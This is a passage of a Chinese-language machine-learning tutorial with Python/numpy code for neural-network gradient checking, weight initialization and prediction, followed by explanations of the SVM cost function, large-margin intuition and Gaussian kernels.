\u9a8c\u8bc1BP\u6b63\u786e\u540e\u5c31\u4e0d\u9700\u8981\u518d\u6267\u884c\u9a8c\u8bc1\u68af\u5ea6\u7684\u7b97\u6cd5\u4e86\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u68c0\u9a8c\u68af\u5ea6\u662f\u5426\u8ba1\u7b97\u6b63\u786e\n# \u68c0\u9a8c\u68af\u5ea6\u662f\u5426\u8ba1\u7b97\u6b63\u786e\ndef checkGradient(Lambda = 0):\n    '''\u6784\u9020\u4e00\u4e2a\u5c0f\u578b\u7684\u795e\u7ecf\u7f51\u7edc\u9a8c\u8bc1\uff0c\u56e0\u4e3a\u6570\u503c\u6cd5\u8ba1\u7b97\u68af\u5ea6\u5f88\u6d6a\u8d39\u65f6\u95f4\uff0c\u800c\u4e14\u9a8c\u8bc1\u6b63\u786e\u540e\u4e4b\u540e\u5c31\u4e0d\u518d\u9700\u8981\u9a8c\u8bc1\u4e86'''\n    input_layer_size = 3\n    hidden_layer_size = 5\n    num_labels = 3\n    m = 5\n    initial_Theta1 = debugInitializeWeights(input_layer_size,hidden_layer_size); \n    initial_Theta2 = debugInitializeWeights(hidden_layer_size,num_labels)\n    X = debugInitializeWeights(input_layer_size-1,m)\n    y = 1+np.transpose(np.mod(np.arange(1,m+1), num_labels))# \u521d\u59cb\u5316y\n    \n    y = y.reshape(-1,1)\n    nn_params = np.vstack((initial_Theta1.reshape(-1,1),initial_Theta2.reshape(-1,1)))  #\u5c55\u5f00theta \n    '''BP\u6c42\u51fa\u68af\u5ea6'''\n    grad = nnGradient(nn_params, input_layer_size, hidden_layer_size, \n                     num_labels, X, y, Lambda)  \n    '''\u4f7f\u7528\u6570\u503c\u6cd5\u8ba1\u7b97\u68af\u5ea6'''\n    num_grad = np.zeros((nn_params.shape[0]))\n    step = np.zeros((nn_params.shape[0]))\n    e = 1e-4\n    for i in range(nn_params.shape[0]):\n        step[i] = e\n        loss1 = nnCostFunction(nn_params-step.reshape(-1,1), input_layer_size, hidden_layer_size, \n                              num_labels, X, y, \n                              Lambda)\n        loss2 = nnCostFunction(nn_params+step.reshape(-1,1), input_layer_size, hidden_layer_size, \n                              num_labels, X, y, \n                              Lambda)\n        num_grad[i] = (loss2-loss1)\/(2*e)\n        step[i]=0\n    # \u663e\u793a\u4e24\u5217\u6bd4\u8f83\n    res = np.hstack((num_grad.reshape(-1,1),grad.reshape(-1,1)))\n    print res\n```\n\n### 7\u3001\u6743\u91cd\u7684\u968f\u673a\u521d\u59cb\u5316\n- \u795e\u7ecf\u7f51\u7edc\u4e0d\u80fd\u50cf\u903b\u8f91\u56de\u5f52\u90a3\u6837\u521d\u59cb\u5316`theta`\u4e3a`0`,\u56e0\u4e3a\u82e5\u662f\u6bcf\u6761\u8fb9\u7684\u6743\u91cd\u90fd\u4e3a0\uff0c\u6bcf\u4e2a\u795e\u7ecf\u5143\u90fd\u662f\u76f8\u540c\u7684\u8f93\u51fa\uff0c\u5728\u53cd\u5411\u4f20\u64ad\u4e2d\u4e5f\u4f1a\u5f97\u5230\u540c\u6837\u7684\u68af\u5ea6\uff0c\u6700\u7ec8\u53ea\u4f1a\u9884\u6d4b\u4e00\u79cd\u7ed3\u679c\u3002\n- \u6240\u4ee5\u5e94\u8be5\u521d\u59cb\u5316\u4e3a\u63a5\u8fd10\u7684\u6570\n- \u5b9e\u73b0\u4ee3\u7801\n```\n# \u968f\u673a\u521d\u59cb\u5316\u6743\u91cdtheta\ndef randInitializeWeights(L_in,L_out):\n    W = np.zeros((L_out,1+L_in))    # \u5bf9\u5e94theta\u7684\u6743\u91cd\n    epsilon_init = (6.0\/(L_out+L_in))**0.5\n    W = np.random.rand(L_out,1+L_in)*2*epsilon_init-epsilon_init # np.random.rand(L_out,1+L_in)\u4ea7\u751fL_out*(1+L_in)\u5927\u5c0f\u7684\u968f\u673a\u77e9\u9635\n    return W\n```\n\n### 8\u3001\u9884\u6d4b\n- \u6b63\u5411\u4f20\u64ad\u9884\u6d4b\u7ed3\u679c\n- \u5b9e\u73b0\u4ee3\u7801\n```\n# \u9884\u6d4b\ndef predict(Theta1,Theta2,X):\n    m = X.shape[0]\n    num_labels = Theta2.shape[0]\n    #p = np.zeros((m,1))\n    '''\u6b63\u5411\u4f20\u64ad\uff0c\u9884\u6d4b\u7ed3\u679c'''\n    X = np.hstack((np.ones((m,1)),X))\n    h1 = sigmoid(np.dot(X,np.transpose(Theta1)))\n    h1 = np.hstack((np.ones((m,1)),h1))\n    h2 = sigmoid(np.dot(h1,np.transpose(Theta2)))\n    \n    '''\n    \u8fd4\u56deh\u4e2d\u6bcf\u4e00\u884c\u6700\u5927\u503c\u6240\u5728\u7684\u5217\u53f7\n    - np.max(h, axis=1)\u8fd4\u56deh\u4e2d\u6bcf\u4e00\u884c\u7684\u6700\u5927\u503c\uff08\u662f\u67d0\u4e2a\u6570\u5b57\u7684\u6700\u5927\u6982\u7387\uff09\n    - \u6700\u540ewhere\u627e\u5230\u7684\u6700\u5927\u6982\u7387\u6240\u5728\u7684\u5217\u53f7\uff08\u5217\u53f7\u5373\u662f\u5bf9\u5e94\u7684\u6570\u5b57\uff09\n    '''\n    #np.savetxt(\"h2.csv\",h2,delimiter=',')\n    p = np.array(np.where(h2[0,:] == np.max(h2, axis=1)[0]))  \n    for i in np.arange(1, m):\n        t = np.array(np.where(h2[i,:] == np.max(h2, axis=1)[i]))\n        p = np.vstack((p,t))\n    return p \n```\n\n### 9\u3001\u8f93\u51fa\u7ed3\u679c\n- \u68af\u5ea6\u68c0\u67e5\uff1a     \n![enter description here][19]\n- \u968f\u673a\u663e\u793a100\u4e2a\u624b\u5199\u6570\u5b57     \n![enter description here][20]\n- \u663e\u793atheta1\u6743\u91cd     \n![enter description here][21]\n- \u8bad\u7ec3\u96c6\u9884\u6d4b\u51c6\u786e\u5ea6     \n![enter description here][22]\n- \u5f52\u4e00\u5316\u540e\u8bad\u7ec3\u96c6\u9884\u6d4b\u51c6\u786e\u5ea6     \n![enter description here][23]\n\n--------------------\n\n## \u56db\u3001SVM\u652f\u6301\u5411\u91cf\u673a\n\n### 1\u3001\u4ee3\u4ef7\u51fd\u6570\n- \u5728\u903b\u8f91\u56de\u5f52\u4e2d\uff0c\u6211\u4eec\u7684\u4ee3\u4ef7\u4e3a\uff1a   \n![\\cos t({h_\\theta }(x),y) = \\left\\{ {\\begin{array}{c}    { - \\log ({h_\\theta }(x))} \\\\    { - \\log (1 - {h_\\theta }(x))}  \\end{array} \\begin{array}{c}    {y = 1} \\\\    {y = 0}  \\end{array} } \\right.](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Ccos%20t%28%7Bh_%5Ctheta%20%7D%28x%29%2Cy%29%20%3D%20%5Cleft%5C%7B%20%7B%5Cbegin%7Barray%7D%7Bc%7D%20%20%20%20%7B%20-%20%5Clog%20%28%7Bh_%5Ctheta%20%7D%28x%29%29%7D%20%5C%5C%20%20%20%20%7B%20-%20%5Clog%20%281%20-%20%7Bh_%5Ctheta%20%7D%28x%29%29%7D%20%20%5Cend%7Barray%7D%20%5Cbegin%7Barray%7D%7Bc%7D%20%20%20%20%7By%20%3D%201%7D%20%5C%5C%20%20%20%20%7By%20%3D%200%7D%20%20%5Cend%7Barray%7D%20%7D%20%5Cright.)\uff0c    \n\u5176\u4e2d\uff1a![{h_\\theta }({\\text{z}}) = \\frac{1}{{1 + {e^{ - z}}}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bh_%5Ctheta%20%7D%28%7B%5Ctext%7Bz%7D%7D%29%20%3D%20%5Cfrac%7B1%7D%7B%7B1%20%2B%20%7Be%5E%7B%20-%20z%7D%7D%7D%7D)\uff0c![z = {\\theta ^T}x](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=z%20%3D%20%7B%5Ctheta%20%5ET%7Dx)\n- \u5982\u56fe\u6240\u793a\uff0c\u5982\u679c`y=1`\uff0c`cost`\u4ee3\u4ef7\u51fd\u6570\u5982\u56fe\u6240\u793a    \n![enter description here][24]    \n\u6211\u4eec\u60f3\u8ba9![{\\theta ^T}x &gt;  &gt; 0](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Ctheta%20%5ET%7Dx%20%3E%20%20%3E%200)\uff0c\u5373`z>>0`\uff0c\u8fd9\u6837\u7684\u8bdd`cost`\u4ee3\u4ef7\u51fd\u6570\u624d\u4f1a\u8d8b\u4e8e\u6700\u5c0f\uff08\u8fd9\u662f\u6211\u4eec\u60f3\u8981\u7684\uff09\uff0c\u6240\u4ee5\u7528\u9014\u4e2d**\u7ea2\u8272**\u7684\u51fd\u6570![\\cos {t_1}(z)](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Ccos%20%7Bt_1%7D%28z%29)\u4ee3\u66ff\u903b\u8f91\u56de\u5f52\u4e2d\u7684cost\n- \u5f53`y=0`\u65f6\u540c\u6837\uff0c\u7528![\\cos {t_0}(z)](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Ccos%20%7Bt_0%7D%28z%29)\u4ee3\u66ff\n![enter description here][25]\n- \u6700\u7ec8\u5f97\u5230\u7684\u4ee3\u4ef7\u51fd\u6570\u4e3a\uff1a    \n![J(\\theta ) = C\\sum\\limits_{i = 1}^m {[{y^{(i)}}\\cos {t_1}({\\theta ^T}{x^{(i)}}) + (1 - {y^{(i)}})\\cos {t_0}({\\theta ^T}{x^{(i)}})} ] + \\frac{1}{2}\\sum\\limits_{j = 1}^{\\text{n}} {\\theta _j^2} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5Ctheta%20%29%20%3D%20C%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%7By%5E%7B%28i%29%7D%7D%5Ccos%20%7Bt_1%7D%28%7B%5Ctheta%20%5ET%7D%7Bx%5E%7B%28i%29%7D%7D%29%20%2B%20%281%20-%20%7By%5E%7B%28i%29%7D%7D%29%5Ccos%20%7Bt_0%7D%28%7B%5Ctheta%20%5ET%7D%7Bx%5E%7B%28i%29%7D%7D%29%7D%20%5D%20%2B%20%5Cfrac%7B1%7D%7B2%7D%5Csum%5Climits_%7Bj%20%3D%201%7D%5E%7B%5Ctext%7Bn%7D%7D%20%7B%5Ctheta%20_j%5E2%7D%20)   \n\u6700\u540e\u6211\u4eec\u60f3\u8981![\\mathop {\\min }\\limits_\\theta  J(\\theta )](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20%5Cmathop%20%7B%5Cmin%20%7D%5Climits_%5Ctheta%20J%28%5Ctheta%20%29)\n- \u4e4b\u524d\u6211\u4eec\u903b\u8f91\u56de\u5f52\u4e2d\u7684\u4ee3\u4ef7\u51fd\u6570\u4e3a\uff1a   \n![J(\\theta ) =  - \\frac{1}{m}\\sum\\limits_{i = 1}^m {[{y^{(i)}}\\log ({h_\\theta }({x^{(i)}}) + (1 - } {y^{(i)}})\\log (1 - {h_\\theta }({x^{(i)}})] + \\frac{\\lambda }{{2m}}\\sum\\limits_{j = 1}^n {\\theta _j^2} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5Ctheta%20%29%20%3D%20%20-%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%7By%5E%7B%28i%29%7D%7D%5Clog%20%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20%2B%20%281%20-%20%7D%20%7By%5E%7B%28i%29%7D%7D%29%5Clog%20%281%20-%20%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%5D%20%2B%20%5Cfrac%7B%5Clambda%20%7D%7B%7B2m%7D%7D%5Csum%5Climits_%7Bj%20%3D%201%7D%5En%20%7B%5Ctheta%20_j%5E2%7D%20)   \n\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u91cc\u7684![C = \\frac{m}{\\lambda }](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=C%20%3D%20%5Cfrac%7Bm%7D%7B%5Clambda%20%7D)\uff0c\u53ea\u662f\u8868\u8fbe\u5f62\u5f0f\u95ee\u9898\uff0c\u8fd9\u91cc`C`\u7684\u503c\u8d8a\u5927\uff0cSVM\u7684\u51b3\u7b56\u8fb9\u754c\u7684`margin`\u4e5f\u8d8a\u5927\uff0c\u4e0b\u9762\u4f1a\u8bf4\u660e\n\n### 2\u3001Large Margin\n- \u5982\u4e0b\u56fe\u6240\u793a,SVM\u5206\u7c7b\u4f1a\u4f7f\u7528\u6700\u5927\u7684`margin`\u5c06\u5176\u5206\u5f00    \n![enter description here][26]\n- \u5148\u8bf4\u4e00\u4e0b\u5411\u91cf\u5185\u79ef\n - ![u = \\left[ {\\begin{array}{c}    {{u_1}} \\\\    {{u_2}}  \\end{array} } \\right]](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=u%20%3D%20%5Cleft%5B%20%7B%5Cbegin%7Barray%7D%7Bc%7D%20%20%20%20%7B%7Bu_1%7D%7D%20%5C%5C%20%20%20%20%7B%7Bu_2%7D%7D%20%20%5Cend%7Barray%7D%20%7D%20%5Cright%5D)\uff0c![v = \\left[ {\\begin{array}{c}    {{v_1}} \\\\    {{v_2}}  \\end{array} } \\right]](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=v%20%3D%20%5Cleft%5B%20%7B%5Cbegin%7Barray%7D%7Bc%7D%20%20%20%20%7B%7Bv_1%7D%7D%20%5C%5C%20%20%20%20%7B%7Bv_2%7D%7D%20%20%5Cend%7Barray%7D%20%7D%20%5Cright%5D)    \n - ![||u||](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7C%7Cu%7C%7C)\u8868\u793a`u`\u7684**\u6b27\u51e0\u91cc\u5f97\u8303\u6570**\uff08\u6b27\u5f0f\u8303\u6570\uff09\uff0c![||u||{\\text{ = }}\\sqrt {{\\text{u}}_1^2 + u_2^2} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7C%7Cu%7C%7C%7B%5Ctext%7B%20%3D%20%7D%7D%5Csqrt%20%7B%7B%5Ctext%7Bu%7D%7D_1%5E2%20%2B%20u_2%5E2%7D%20)\n - `\u5411\u91cfV`\u5728`\u5411\u91cfu`\u4e0a\u7684\u6295\u5f71\u7684\u957f\u5ea6\u8bb0\u4e3a`p`\uff0c\u5219\uff1a\u5411\u91cf\u5185\u79ef\uff1a    \n ![{{\\text{u}}^T}v = p||u|| = {u_1}{v_1} + {u_2}{v_2}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7B%5Ctext%7Bu%7D%7D%5ET%7Dv%20%3D%20p%7C%7Cu%7C%7C%20%3D%20%7Bu_1%7D%7Bv_1%7D%20%2B%20%7Bu_2%7D%7Bv_2%7D)      \n ![enter description here][27]  \n\u6839\u636e\u5411\u91cf\u5939\u89d2\u516c\u5f0f\u63a8\u5bfc\u4e00\u4e0b\u5373\u53ef\uff0c![\\cos \\theta  = \\frac{{\\overrightarrow {\\text{u}} \\overrightarrow v }}{{|\\overrightarrow {\\text{u}} ||\\overrightarrow v |}}](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20%5Ccos%20%5Ctheta%20%3D%20%5Cfrac%7B%7B%5Coverrightarrow%20%7B%5Ctext%7Bu%7D%7D%20%5Coverrightarrow%20v%20%7D%7D%7B%7B%7C%5Coverrightarrow%20%7B%5Ctext%7Bu%7D%7D%20%7C%7C%5Coverrightarrow%20v%20%7C%7D%7D)\n\n- \u524d\u9762\u8bf4\u8fc7\uff0c\u5f53`C`\u8d8a\u5927\u65f6\uff0c`margin`\u4e5f\u5c31\u8d8a\u5927\uff0c\u6211\u4eec\u7684\u76ee\u7684\u662f\u6700\u5c0f\u5316\u4ee3\u4ef7\u51fd\u6570`J(\u03b8)`,\u5f53`margin`\u6700\u5927\u65f6\uff0c`C`\u7684\u4e58\u79ef\u9879![\\sum\\limits_{i = 1}^m {[{y^{(i)}}\\cos {t_1}({\\theta ^T}{x^{(i)}}) + (1 - {y^{(i)}})\\cos {t_0}({\\theta ^T}{x^{(i)}})} ]](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%7By%5E%7B%28i%29%7D%7D%5Ccos%20%7Bt_1%7D%28%7B%5Ctheta%20%5ET%7D%7Bx%5E%7B%28i%29%7D%7D%29%20%2B%20%281%20-%20%7By%5E%7B%28i%29%7D%7D%29%5Ccos%20%7Bt_0%7D%28%7B%5Ctheta%20%5ET%7D%7Bx%5E%7B%28i%29%7D%7D%29%7D%20%5D)\u8981\u5f88\u5c0f\uff0c\u6240\u4ee5\u8fd1\u4f3c\u4e3a\uff1a   \n![J(\\theta ) = C0 + \\frac{1}{2}\\sum\\limits_{j = 1}^{\\text{n}} {\\theta _j^2}  = \\frac{1}{2}\\sum\\limits_{j = 1}^{\\text{n}} {\\theta _j^2}  = \\frac{1}{2}(\\theta _1^2 + \\theta _2^2) = \\frac{1}{2}{\\sqrt {\\theta _1^2 + \\theta _2^2} ^2}](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20J%28%5Ctheta%20%29%20%3D%20C0%20&plus;%20%5Cfrac%7B1%7D%7B2%7D%5Csum%5Climits_%7Bj%20%3D%201%7D%5E%7B%5Ctext%7Bn%7D%7D%20%7B%5Ctheta%20_j%5E2%7D%20%3D%20%5Cfrac%7B1%7D%7B2%7D%5Csum%5Climits_%7Bj%20%3D%201%7D%5E%7B%5Ctext%7Bn%7D%7D%20%7B%5Ctheta%20_j%5E2%7D%20%3D%20%5Cfrac%7B1%7D%7B2%7D%28%5Ctheta%20_1%5E2%20&plus;%20%5Ctheta%20_2%5E2%29%20%3D%20%5Cfrac%7B1%7D%7B2%7D%7B%5Csqrt%20%7B%5Ctheta%20_1%5E2%20&plus;%20%5Ctheta%20_2%5E2%7D%20%5E2%7D)\uff0c      \n\u6211\u4eec\u6700\u540e\u7684\u76ee\u7684\u5c31\u662f\u6c42\u4f7f\u4ee3\u4ef7\u6700\u5c0f\u7684`\u03b8`\n- \u7531   \n![\\left\\{ {\\begin{array}{c}    {{\\theta ^T}{x^{(i)}} \\geqslant 1} \\\\    {{\\theta ^T}{x^{(i)}} \\leqslant  - 1}  \\end{array} } \\right.\\begin{array}{c}    {({y^{(i)}} = 1)} \\\\    {({y^{(i)}} = 0)}  \\end{array} ](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20%5Cleft%5C%7B%20%7B%5Cbegin%7Barray%7D%7Bc%7D%20%7B%7B%5Ctheta%20%5ET%7D%7Bx%5E%7B%28i%29%7D%7D%20%5Cgeqslant%201%7D%20%5C%5C%20%7B%7B%5Ctheta%20%5ET%7D%7Bx%5E%7B%28i%29%7D%7D%20%5Cleqslant%20-%201%7D%20%5Cend%7Barray%7D%20%7D%20%5Cright.%5Cbegin%7Barray%7D%7Bc%7D%20%7B%28%7By%5E%7B%28i%29%7D%7D%20%3D%201%29%7D%20%5C%5C%20%7B%28%7By%5E%7B%28i%29%7D%7D%20%3D%200%29%7D%20%5Cend%7Barray%7D)\u53ef\u4ee5\u5f97\u5230\uff1a    \n![\\left\\{ {\\begin{array}{c}    {{p^{(i)}}||\\theta || \\geqslant 1} \\\\    {{p^{(i)}}||\\theta || \\leqslant  - 1}  \\end{array} } \\right.\\begin{array}{c}    {({y^{(i)}} = 1)} \\\\    {({y^{(i)}} = 0)}  \\end{array} ](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20%5Cleft%5C%7B%20%7B%5Cbegin%7Barray%7D%7Bc%7D%20%7B%7Bp%5E%7B%28i%29%7D%7D%7C%7C%5Ctheta%20%7C%7C%20%5Cgeqslant%201%7D%20%5C%5C%20%7B%7Bp%5E%7B%28i%29%7D%7D%7C%7C%5Ctheta%20%7C%7C%20%5Cleqslant%20-%201%7D%20%5Cend%7Barray%7D%20%7D%20%5Cright.%5Cbegin%7Barray%7D%7Bc%7D%20%7B%28%7By%5E%7B%28i%29%7D%7D%20%3D%201%29%7D%20%5C%5C%20%7B%28%7By%5E%7B%28i%29%7D%7D%20%3D%200%29%7D%20%5Cend%7Barray%7D)\uff0c`p`\u5373\u4e3a`x`\u5728`\u03b8`\u4e0a\u7684\u6295\u5f71\n- \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5047\u8bbe\u51b3\u7b56\u8fb9\u754c\u5982\u56fe\uff0c\u627e\u5176\u4e2d\u7684\u4e00\u4e2a\u70b9\uff0c\u5230`\u03b8`\u4e0a\u7684\u6295\u5f71\u4e3a`p`,\u5219![p||\\theta || \\geqslant 1](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20p%7C%7C%5Ctheta%20%7C%7C%20%5Cgeqslant%201)\u6216\u8005![p||\\theta || \\leqslant  - 1](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20p%7C%7C%5Ctheta%20%7C%7C%20%5Cleqslant%20-%201)\uff0c\u82e5\u662f`p`\u5f88\u5c0f\uff0c\u5219\u9700\u8981![||\\theta ||](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7C%7C%5Ctheta%20%7C%7C)\u5f88\u5927\uff0c\u8fd9\u4e0e\u6211\u4eec\u8981\u6c42\u7684`\u03b8`\u4f7f![||\\theta || = \\frac{1}{2}\\sqrt {\\theta _1^2 + \\theta _2^2} ](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20%7C%7C%5Ctheta%20%7C%7C%20%3D%20%5Cfrac%7B1%7D%7B2%7D%5Csqrt%20%7B%5Ctheta%20_1%5E2%20&plus;%20%5Ctheta%20_2%5E2%7D)\u6700\u5c0f\u76f8\u8fdd\u80cc\uff0c**\u6240\u4ee5**\u6700\u540e\u6c42\u7684\u662f`large margin`   \n![enter description here][28]\n\n### 3\u3001SVM Kernel\uff08\u6838\u51fd\u6570\uff09\n- \u5bf9\u4e8e\u7ebf\u6027\u53ef\u5206\u7684\u95ee\u9898\uff0c\u4f7f\u7528**\u7ebf\u6027\u6838\u51fd\u6570**\u5373\u53ef\n- \u5bf9\u4e8e\u7ebf\u6027\u4e0d\u53ef\u5206\u7684\u95ee\u9898\uff0c\u5728\u903b\u8f91\u56de\u5f52\u4e2d\uff0c\u6211\u4eec\u662f\u5c06`feature`\u6620\u5c04\u4e3a\u4f7f\u7528\u591a\u9879\u5f0f\u7684\u5f62\u5f0f![1 + {x_1} + {x_2} + x_1^2 + {x_1}{x_2} + x_2^2](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=1%20%2B%20%7Bx_1%7D%20%2B%20%7Bx_2%7D%20%2B%20x_1%5E2%20%2B%20%7Bx_1%7D%7Bx_2%7D%20%2B%20x_2%5E2)\uff0c`SVM`\u4e2d\u4e5f\u6709**\u591a\u9879\u5f0f\u6838\u51fd\u6570**\uff0c\u4f46\u662f\u66f4\u5e38\u7528\u7684\u662f**\u9ad8\u65af\u6838\u51fd\u6570**\uff0c\u4e5f\u79f0\u4e3a**RBF\u6838**\n- \u9ad8\u65af\u6838\u51fd\u6570\u4e3a\uff1a![f(x) = {e^{ - \\frac{{||x - u|{|^2}}}{{2{\\sigma ^2}}}}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=f%28x%29%20%3D%20%7Be%5E%7B%20-%20%5Cfrac%7B%7B%7C%7Cx%20-%20u%7C%7B%7C%5E2%7D%7D%7D%7B%7B2%7B%5Csigma%20%5E2%7D%7D%7D%7D%7D)     \n\u5047\u8bbe\u5982\u56fe\u51e0\u4e2a\u70b9\uff0c\n![enter description here][29]\n\u4ee4\uff1a   \n![{f_1} = similarity(x,{l^{(1)}}) = {e^{ - \\frac{{||x - {l^{(1)}}|{|^2}}}{{2{\\sigma ^2}}}}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bf_1%7D%20%3D%20similarity%28x%2C%7Bl%5E%7B%281%29%7D%7D%29%20%3D%20%7Be%5E%7B%20-%20%5Cfrac%7B%7B%7C%7Cx%20-%20%7Bl%5E%7B%281%29%7D%7D%7C%7B%7C%5E2%7D%7D%7D%7B%7B2%7B%5Csigma%20%5E2%7D%7D%7D%7D%7D)   \n![{f_2} = similarity(x,{l^{(2)}}) = {e^{ - \\frac{{||x - {l^{(2)}}|{|^2}}}{{2{\\sigma ^2}}}}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bf_2%7D%20%3D%20similarity%28x%2C%7Bl%5E%7B%282%29%7D%7D%29%20%3D%20%7Be%5E%7B%20-%20%5Cfrac%7B%7B%7C%7Cx%20-%20%7Bl%5E%7B%282%29%7D%7D%7C%7B%7C%5E2%7D%7D%7D%7B%7B2%7B%5Csigma%20%5E2%7D%7D%7D%7D%7D)\n.\n.\n.\n- \u53ef\u4ee5\u770b\u51fa\uff0c\u82e5\u662f`x`\u4e0e![{l^{(1)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bl%5E%7B%281%29%7D%7D)\u8ddd\u79bb\u8f83\u8fd1\uff0c==\u300b![{f_1} \\approx {e^0} = 1](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bf_1%7D%20%5Capprox%20%7Be%5E0%7D%20%3D%201)\uff0c\uff08\u5373\u76f8\u4f3c\u5ea6\u8f83\u5927\uff09   \n\u82e5\u662f`x`\u4e0e![{l^{(1)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bl%5E%7B%281%29%7D%7D)\u8ddd\u79bb\u8f83\u8fdc\uff0c==\u300b![{f_2} \\approx {e^{ - \\infty }} = 0](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bf_2%7D%20%5Capprox%20%7Be%5E%7B%20-%20%5Cinfty%20%7D%7D%20%3D%200)\uff0c\uff08\u5373\u76f8\u4f3c\u5ea6\u8f83\u4f4e\uff09\n- \u9ad8\u65af\u6838\u51fd\u6570\u7684`\u03c3`\u8d8a\u5c0f\uff0c`f`\u4e0b\u964d\u7684\u8d8a\u5feb      \n![enter description here][30]\n![enter description here][31]\n\n- \u5982\u4f55\u9009\u62e9\u521d\u59cb\u7684![{l^{(1)}}{l^{(2)}}{l^{(3)}}...](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bl%5E%7B%281%29%7D%7D%7Bl%5E%7B%282%29%7D%7D%7Bl%5E%7B%283%29%7D%7D...)\n - \u8bad\u7ec3\u96c6\uff1a![(({x^{(1)}},{y^{(1)}}),({x^{(2)}},{y^{(2)}}),...({x^{(m)}},{y^{(m)}}))](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%28%28%7Bx%5E%7B%281%29%7D%7D%2C%7By%5E%7B%281%29%7D%7D%29%2C%28%7Bx%5E%7B%282%29%7D%7D%2C%7By%5E%7B%282%29%7D%7D%29%2C...%28%7Bx%5E%7B%28m%29%7D%7D%2C%7By%5E%7B%28m%29%7D%7D%29%29)\n - \u9009\u62e9\uff1a![{l^{(1)}} = {x^{(1)}},{l^{(2)}} = {x^{(2)}}...{l^{(m)}} = {x^{(m)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bl%5E%7B%281%29%7D%7D%20%3D%20%7Bx%5E%7B%281%29%7D%7D%2C%7Bl%5E%7B%282%29%7D%7D%20%3D%20%7Bx%5E%7B%282%29%7D%7D...%7Bl%5E%7B%28m%29%7D%7D%20%3D%20%7Bx%5E%7B%28m%29%7D%7D)\n - \u5bf9\u4e8e\u7ed9\u51fa\u7684`x`\uff0c\u8ba1\u7b97`f`,\u4ee4\uff1a![f_0^{(i)} = 1](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=f_0%5E%7B%28i%29%7D%20%3D%201)\u6240\u4ee5\uff1a![{f^{(i)}} \\in {R^{m + 1}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bf%5E%7B%28i%29%7D%7D%20%5Cin%20%7BR%5E%7Bm%20%2B%201%7D%7D)\n - \u6700\u5c0f\u5316`J`\u6c42\u51fa`\u03b8`\uff0c          \n ![J(\\theta ) = C\\sum\\limits_{i = 1}^m 